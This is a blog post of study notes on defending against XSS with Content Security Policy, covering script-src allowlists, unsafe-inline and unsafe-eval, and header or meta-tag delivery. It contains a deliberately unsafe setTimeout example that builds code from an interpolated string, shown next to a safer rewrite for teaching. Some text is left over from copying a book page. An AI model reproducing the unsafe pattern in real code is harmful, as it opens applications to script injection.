<p>CSP allows you to specifically whitelist URLs from which dynamic scripts can be<br>loaded. This is known as script-src in your CSP. A simple script-src looks like<br>this: Content-Security-Policy: script-src “self” <a target="_blank" rel="noopener" href="https://api.megabank.com/">https://api.megabank.com</a>.<br>With such a CSP configuration, attempting to load a script from <a target="_blank" rel="noopener" href="https://api2.megabank.com/">https://api2.megabank.com</a> would not be successful, and the browser would throw a CSP violation<br>error. This is very beneficial because it means scripts from unknown sources, like<br><a target="_blank" rel="noopener" href="https://www.hacker.com/">https://www.hacker.com</a>, would not be able to load and execute on your site</p>
<p>One way to mitigate the risk of scripts you did not write executing inside of your<br>application is to reduce the number of allowed script sources.<br>####Unsafe Eval and Unsafe Inline<br>By default, inline script execution is disabled when CSP is enabled. This can be reenabled by adding unsafe-inline to your script-src definition.<br>Similarly, eval() and similar methods that provide string -&gt; code interpretation<br>are disabled by default when CSP is enabled. This can be disabled with the flag<br>unsafe-eval inside of your script-src definition.</p>
<p>If you are relying on eval or an eval-like function, it is often wise to try to rewrite<br>that function in a way that does not cause it to be interpreted as a string. For example:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> startCountDownTimer = <span class="function"><span class="keyword">function</span>(<span class="params">minutes, message</span>) </span>&#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(<span class="string">`window.alert(<span class="subst">$&#123;message&#125;</span>);`</span>, minutes * <span class="number">60</span> * <span class="number">1000</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>is written more safely as:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> startCountDownTimer = <span class="function"><span class="keyword">function</span>(<span class="params">minutes, message</span>) </span>&#123;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> alert(message);</span><br><span class="line">&#125;, minutes * <span class="number">60</span> * <span class="number">1000</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>While both are valid uses of setTimeout(), one is much more prone to XSS script<br>execution as the complexity of the function grows with the addition of new features.<br>Any function that is interpreted as a string risks potential escape, leading to code exe‐<br>cution. More specific functions with highly specific parameters reduce the risk of<br>unintended script execution.<br>####Implementing a CSP</p>
<p>CSP is easy to implement as it is simply a string configuration modifier that is read by<br>the browser and translated into security rules</p>
<p>P, but the most common are:</p>
<ul>
<li>Have your server send a content-Security-Policy header with each request.<br>The data in the header should be the security policy itself.</li>
<li>Embed a <meta> tag in your HTML markup. The meta tag should look like:<meta http-equiv="Content-Security-Policy" content="script-src
https://www.mega-bank.com;">
It is wise to enact CSP as a first step in XSS mitigation if you already know what type
of programming constructs and APIs your application will rely on. This means that if
you know where you will consume code and how you will consume it, make sure to
244 | Chapter 22: Defending Against XSS Attacks
write the correct CSP strings up and utilize them right when you start development.
CSP can be easily changed at a later date.
###Summary
difficulty is protecting your website against XSS usually comes when u have a feature requirement to display user-submitted infor as DOM rather than as text.</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/09/17/Defending%20Against%20XSS/" data-id="ckfah5pjl000490thhkt02nkj" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/09/20/test/">(no title)</a>
          </li>
        
          <li>
            <a href="/2020/09/19/XXE-notes-intro-level/">XXE-notes-intro-level</a>
          </li>
        
          <li>
            <a href="/2020/09/19/GitHub%20host%E9%85%8D%E7%BD%AE/">Github host 配置</a>
          </li>
        
          <li>
            <a href="/2020/09/19/Caketi-on-the-way/">Caketi  on the way</a>
          </li>
        
          <li>
            <a href="/2020/09/19/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 caketi<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>